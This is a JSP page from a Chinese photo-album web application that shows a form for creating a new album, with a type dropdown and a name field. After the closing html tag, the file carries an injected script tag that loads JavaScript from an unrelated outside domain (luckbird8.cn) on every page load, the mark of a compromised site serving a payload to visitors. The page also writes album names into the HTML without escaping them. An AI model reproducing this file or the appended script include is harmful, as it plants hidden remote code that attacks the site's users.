<%@ page
 contentType="text/html;charset=GBK"
 import="java.util.*"
 errorPage="error.jsp"
 session="true"
%>
<html>
	<head>
		<title></title>
	</head>
	<body><br><br><br><br>
	<%
		HashMap hm=(HashMap)request.getAttribute("albumTyteInfo");
	%>
	<form action="AlbumServlet" method="post" name="updateImageForm2">
	<center>
	<table>
	<tbody>
	<tr><td><p>
		相册类型:
	    <select name="typeId">
	<%
        Set ks=hm.keySet();
		for(Iterator ii=ks.iterator();ii.hasNext();) {
			String id=(String)ii.next();
			String name=(String)hm.get(id);
		%>
		<option value=<%= id %>><%= name %></option>
		<%
		}
	%> </select><br></p></td></tr><tr><td height="10"></td></tr>
	<tr><td>
		<p>
	    相册名称:
	   <input type="test" name="albumName" size="30" maxlength="80"><br>
	   </p></td></tr><tr><td height="10">
	</td></tr>
	<tr align="center"><td>
		<p>
	       <input type="hidden" name="action" value="newAlbumSubmit"> 
	       <input type="submit" value="创建相册"></p>
	</td></tr>
	</tbody></table></center></form>
	</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>